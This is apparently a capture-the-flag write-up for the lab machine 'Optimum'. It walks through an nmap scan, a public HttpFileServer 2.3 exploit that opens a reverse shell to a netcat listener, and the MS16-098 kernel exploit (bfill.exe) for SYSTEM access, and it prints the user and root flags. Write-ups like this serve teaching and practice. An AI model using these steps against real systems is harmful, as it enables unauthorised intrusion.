# Optimum - Easy

## Enumeration
`sudo nmap 10.129.76.230 -p- -sV -A -vv --open -reason -Pn`

Port 80 was open, so upon visiting the website:
![Imgur](https://i.imgur.com/Qi1irof.jpg)

## Getting A Shell

A quick search for "HttpFileServer 2.3" yields the following exploit:
https://www.exploit-db.com/exploits/39161

Making the necessary changes for `ip_addr` and `local_port`, and opening a listener on kali, yields a low level shell:
```
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.76.230] 49174
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>
```
The `user.txt` is easily obtained:
```
C:\Users\kostas\Desktop>type user.txt
type user.txt
cbf77b2a3420ac745c39e53fcf3282f2
```

## Privilege Escalation
Decided to use the Windows Exploit Suggester (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

1. Updated the database: 
    ```
    python2 windows-exploit-suggester.py --update
    ```
2. Had to update `python2`and upgrade the `python-xlrd` library: 
    ```
    sudo apt upgrade python2

    wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

    python2 get-pip.py

    python2 -m pip install --user xlrd==1.1.0
    ```
3. Saving the `systeminfo` into a text file and using it in the exploit suggester:
    ```
    python2 windows-exploit-suggester.py --database 2023-05-16-mssb.xls --systeminfo sysinfo.txt
    ```

There were many exploits listed. The initial one I tried was `MS16-032`, but no bueno. Searching around on Google for the Windows version (6.3.9600), I (unknowingly) found another Optimum write-up (which I didn't realise it was for this box), and for version 6.3.9600, `MS16-098` was used.

I used the compiled version of the kernel exploit from https://github.com/SecWiki/windows-kernel-exploits, called `bfill.exe`, transferred the file to the box via `powershell`, and executed `bfill.exe` in `C:\Windows\Tasks`, hence obtaining a root shell.
```
C:\Windows\Tasks>.\bfill.exe
.\bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\Tasks>whoami
whoami
nt authority\system
```

The `root.txt` was easily obtained:
```
C:\Windows\Tasks\type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
d60130864088f11e9e2ea1d62204c0e7
```

GG.